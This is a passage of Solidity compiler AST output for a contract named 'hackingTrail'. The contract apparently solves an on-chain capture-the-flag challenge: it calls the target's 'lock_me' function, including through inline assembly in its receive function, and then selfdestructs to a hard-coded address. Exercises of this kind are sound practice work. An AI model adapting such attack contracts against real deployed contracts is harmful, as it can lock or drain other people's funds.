									"parameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 17,
												"mutability": "mutable",
												"name": "winner",
												"nameLocation": "355:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 43,
												"src": "347:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 16,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "347:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "346:16:0"
									},
									"returnParameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "369:0:0"
									},
									"scope": 52,
									"src": "327:162:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 50,
										"nodeType": "Block",
										"src": "522:30:0",
										"statements": [
											{
												"expression": {
													"id": 48,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 46,
														"name": "lock",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "533:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "74727565",
														"id": 47,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "540:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "533:11:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 49,
												"nodeType": "ExpressionStatement",
												"src": "533:11:0"
											}
										]
									},
									"functionSelector": "4c228cc7",
									"id": 51,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "lock_me",
									"nameLocation": "506:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "513:2:0"
									},
									"returnParameters": {
										"id": 45,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "522:0:0"
									},
									"scope": 52,
									"src": "497:55:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 102,
							"src": "251:304:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "hackingTrail",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 101,
							"linearizedBaseContracts": [
								101
							],
							"name": "hackingTrail",
							"nameLocation": "568:12:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": true,
									"id": 55,
									"mutability": "constant",
									"name": "challengeAddr",
									"nameLocation": "615:13:0",
									"nodeType": "VariableDeclaration",
									"scope": 101,
									"src": "590:83:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 53,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "590:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307863443741423830446137433839336638366641386465444466383632623734443934663434373845",
										"id": 54,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "631:42:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 69,
										"nodeType": "Block",
										"src": "700:140:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 64,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 58,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "719:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 59,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "719:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																		"id": 62,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "741:42:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 61,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "733:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 60,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "733:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 63,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "733:51:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "719:65:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f",
															"id": 65,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "786:33:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																"typeString": "literal_string \"lol how did you even find this?\""
															},
															"value": "lol how did you even find this?"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																"typeString": "literal_string \"lol how did you even find this?\""
															}
														],
														"id": 57,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "711:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 66,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "711:109:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 67,
												"nodeType": "ExpressionStatement",
												"src": "711:109:0"
											},
											{
												"id": 68,
												"nodeType": "PlaceholderStatement",
												"src": "831:1:0"
											}
										]
									},
									"id": 70,
									"name": "onlyRoki",
									"nameLocation": "691:8:0",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 56,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "700:0:0"
									},
									"src": "682:158:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 94,
										"nodeType": "Block",
										"src": "887:173:0",
										"statements": [
											{
												"assignments": [
													77
												],
												"declarations": [
													{
														"constant": false,
														"id": 77,
														"mutability": "mutable",
														"name": "challenge",
														"nameLocation": "909:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 94,
														"src": "898:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_IChallenge_$10",
															"typeString": "contract IChallenge"
														},
														"typeName": {
															"id": 76,
															"nodeType": "UserDefinedTypeName",
															"pathNode": {
																"id": 75,
																"name": "IChallenge",
																"nodeType": "IdentifierPath",
																"referencedDeclaration": 10,
																"src": "898:10:0"
															},
															"referencedDeclaration": 10,
															"src": "898:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IChallenge_$10",
																"typeString": "contract IChallenge"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 81,
												"initialValue": {
													"arguments": [
														{
															"id": 79,
															"name": "challengeAddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 55,
															"src": "932:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 78,
														"name": "IChallenge",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 10,
														"src": "921:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_IChallenge_$10_$",
															"typeString": "type(contract IChallenge)"
														}
													},
													"id": 80,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "921:25:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_IChallenge_$10",
														"typeString": "contract IChallenge"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "898:48:0"
											},
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"id": 82,
															"name": "challenge",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 77,
															"src": "957:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IChallenge_$10",
																"typeString": "contract IChallenge"
															}
														},
														"id": 84,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "lock_me",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 9,
														"src": "957:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
															"typeString": "function () external"
														}
													},
													"id": 85,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "957:19:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 86,
												"nodeType": "ExpressionStatement",
												"src": "957:19:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																	"id": 90,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1008:42:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 89,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1000:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 88,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1000:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 91,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1000:51:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 87,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "987:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 92,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "987:65:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 93,
												"nodeType": "ExpressionStatement",
												"src": "987:65:0"
											}
										]
									},
									"functionSelector": "157bca60",
									"id": 95,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"id": 73,
											"kind": "modifierInvocation",
											"modifierName": {
												"id": 72,
												"name": "onlyRoki",
												"nodeType": "IdentifierPath",
												"referencedDeclaration": 70,
												"src": "878:8:0"
											},
											"nodeType": "ModifierInvocation",
											"src": "878:8:0"
										}
									],
									"name": "hackTrail",
									"nameLocation": "857:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "866:2:0"
									},
									"returnParameters": {
										"id": 74,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "887:0:0"
									},
									"scope": 101,
									"src": "848:212:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 99,
										"nodeType": "Block",
										"src": "1095:227:0",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "1115:200:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1137:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1140:10:0",
																		"type": "",
																		"value": "0x4c228cc7"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1130:6:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "1130:21:0"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1130:21:0"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1165:48:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "gas",
																			"nodeType": "YulIdentifier",
																			"src": "1183:3:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1183:5:0"
																	},
																	{
																		"name": "challengeAddr",
																		"nodeType": "YulIdentifier",
																		"src": "1189:13:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1203:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1205:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1207:1:0",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1209:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1211:1:0",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "call",
																	"nodeType": "YulIdentifier",
																	"src": "1178:4:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "1178:35:0"
															},
															"variables": [
																{
																	"name": "check",
																	"nodeType": "YulTypedName",
																	"src": "1169:5:0",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1243:61:0",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1269:1:0",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [],
																					"functionName": {
																						"name": "returndatasize",
																						"nodeType": "YulIdentifier",
																						"src": "1272:14:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1272:16:0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1262:6:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1262:27:0"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1262:27:0"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "check",
																		"nodeType": "YulIdentifier",
																		"src": "1233:5:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1240:1:0",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1230:2:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "1230:12:0"
															},
															"nodeType": "YulIf",
															"src": "1227:77:0"
														}
													]
												},
												"evmVersion": "london",
												"externalReferences": [
													{
														"declaration": 55,
														"isOffset": false,
														"isSlot": false,
														"src": "1189:13:0",
														"valueSize": 1
													}
												],
												"id": 98,
												"nodeType": "InlineAssembly",
												"src": "1106:209:0"
											}
										]
									},
									"id": 100,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1075:2:0"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1095:0:0"
									},
									"scope": 101,
									"src": "1068:254:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 102,
							"src": "559:766:0",
							"usedErrors": []
						}
					],
					"src": "0:1325:0"
				},
				"id": 0
			}
		}
	}
}